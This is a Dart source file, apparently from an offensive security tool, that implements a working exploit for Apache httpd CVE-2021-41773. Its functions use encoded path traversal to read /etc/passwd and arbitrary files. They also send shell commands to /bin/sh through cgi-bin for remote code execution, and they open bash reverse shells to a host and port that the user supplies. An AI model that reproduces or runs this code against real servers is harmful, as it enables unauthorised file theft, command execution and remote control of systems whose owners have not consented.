import '../../../core/net/raw_http_client.dart';

import 'exp_result.dart';
import 'waf_detect.dart';

class ApacheHttpdExpService {
  final String baseUrl;
  final Duration timeout;

  ApacheHttpdExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  // 必须把服务自己的 timeout 传进去：raw client 默认 10 秒，
  // 之前 UI 上调的超时对 httpd 完全无效（探测会在慢目标上拖 16 秒）。
  late final RawHttpClient _rawClient = RawHttpClient(timeout: timeout);

  Future<String?> _sendRawHttp({
    required String method,
    required String rawPath,
    String? body,
    Map<String, String>? headers,
  }) async {
    final res = await _rawClient.send(
      baseUrl: _base,
      request: RawHttpRequest(
        method: method,
        rawPath: rawPath,
        headers: headers ?? const {},
        body: body ?? '',
      ),
    );
    return res?.body;
  }

  /// 需要状态码的探测走这里（raw client 只回原始文本，状态在首行）。
  Future<({int? status, String? body})> _sendRawHttpEx({
    required String method,
    required String rawPath,
  }) async {
    final res = await _rawClient.send(
      baseUrl: _base,
      request: RawHttpRequest(method: method, rawPath: rawPath),
    );
    return (status: _parseStatus(res?.raw), body: res?.body);
  }

  Future<({int? status, String? body})> _sendRawHttpExPost({
    required String rawPath,
    required String body,
  }) async {
    final res = await _rawClient.send(
      baseUrl: _base,
      request: RawHttpRequest(
        method: 'POST',
        rawPath: rawPath,
        headers: const {'Content-Type': 'application/x-www-form-urlencoded'},
        body: body,
      ),
    );
    return (status: _parseStatus(res?.raw), body: res?.body);
  }

  static int? _parseStatus(String? raw) {
    if (raw == null) return null;
    final m = RegExp(r'^HTTP/\d(?:\.\d)?\s+(\d{3})').firstMatch(raw.trimLeft());
    return m == null ? null : int.tryParse(m.group(1)!);
  }

  Future<ExpResult> check() async {
    try {
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        '/icons/.%2e/%2e%2e/%2e%2e/etc/passwd',
      ];
      var sawResponse = false;
      for (final rawPath in candidates) {
        final res = await _sendRawHttpEx(method: 'GET', rawPath: rawPath);
        if (res.status != null) sawResponse = true;
        final blocked =
            wafBlockedResult('CVE-2021-41773', res.status, res.body);
        if (blocked != null) return blocked;
        final body = res.body;
        // 只认 passwd 的结构特征：任何文档/目录列表都可能出现 /bin/sh。
        final text = body ?? '';
        final looksPasswd = RegExp(r'root:[^:\n]*:0:0:').hasMatch(text) ||
            RegExp(r'daemon:[^:\n]*:1:1:').hasMatch(text);
        if (looksPasswd) {
          return ExpResult(true, 'CVE-2021-41773', '路径穿越成功，读取到 /etc/passwd');
        }
      }
      // 一个响应都没拿到 = 目标不可达，不能报"没有漏洞"。
      if (!sawResponse) {
        return ExpResult.probeFailed(
          'CVE-2021-41773',
          '目标不可达（raw HTTP 无响应）',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('CVE-2021-41773', '探测失败: $e');
    }
    return ExpResult(false, 'CVE-2021-41773', '');
  }

  Future<String?> readFile(String filePath) async {
    try {
      final normalizedPath = filePath.startsWith('/') ? filePath : '/$filePath';
      final candidates = [
        '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e$normalizedPath',
        '/icons/.%2e/%2e%2e/%2e%2e$normalizedPath',
      ];
      for (final rawPath in candidates) {
        final res = await _sendRawHttpEx(method: 'GET', rawPath: rawPath);
        if (res.status != 200) continue;
        final body = res.body;
        if (body != null && body.isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<String?> execRce(String cmd) async {
    try {
      final candidates = [
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
        '/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh',
      ];
      for (final rawPath in candidates) {
        final res = await _sendRawHttpExPost(
          rawPath: rawPath,
          body: 'echo Content-Type: text/plain; echo; $cmd',
        );
        // 实测踩过的坑：WAF 或路径被规范化后，返回的是 Apache 404 错误页，
        // 旧实现把它当命令输出原样返回（看起来像"执行成功"）。
        if (res.status != 200) continue;
        final body = res.body;
        if (body == null) continue;
        final head = body.trimLeft().toLowerCase();
        if (head.startsWith('<!doctype') || head.startsWith('<html')) continue;
        if (body.trim().isNotEmpty) return body;
      }
      return null;
    } catch (_) {
      return null;
    }
  }

  Future<bool> getShell({
    required String lhost,
    required int lport,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = 'bash -i >& /dev/tcp/$host/$lport 0>&1';
    final out = await execRce(cmd);
    // Reverse shell usually has no useful HTTP body; success is request accepted.
    return out != null;
  }

  Future<bool> startReverseShell(
    String lhost,
    int lport, {
    bool preferScript = true,
  }) async {
    final host = lhost.trim();
    if (host.isEmpty || lport <= 0 || lport > 65535) return false;
    final cmd = preferScript
        ? "bash -c 'export TERM=xterm-256color; "
            "if command -v script >/dev/null 2>&1; then "
            "script -q /dev/null bash >& /dev/tcp/$host/$lport 0>&1; "
            "elif command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &"
        : "bash -c 'export TERM=xterm-256color; "
            "if command -v bash >/dev/null 2>&1; then "
            "bash -i >& /dev/tcp/$host/$lport 0>&1; "
            "else /bin/sh -i >& /dev/tcp/$host/$lport 0>&1; fi' >/dev/null 2>&1 &";
    final out = await execRce(cmd);
    return out != null;
  }
}

